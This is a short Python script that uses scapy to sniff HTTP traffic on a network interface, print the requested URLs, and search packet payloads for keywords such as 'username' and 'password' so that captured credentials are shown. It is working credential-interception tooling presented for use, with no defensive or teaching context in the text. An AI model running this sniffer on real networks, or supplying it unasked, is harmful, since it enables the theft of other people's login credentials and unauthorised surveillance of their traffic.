import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "login", "user", "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load


def process_sniffed_packet(packet):
    packet_dict = {}
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("\033[1;37;40m HTTP Request:\t\t" + str(url))

        login_info = get_login_info(packet)

        if login_info:
            print("\033[1;32;40m Possible credentials:\t" +
                  str(login_info) + "\n\n")


sniff("eth0")
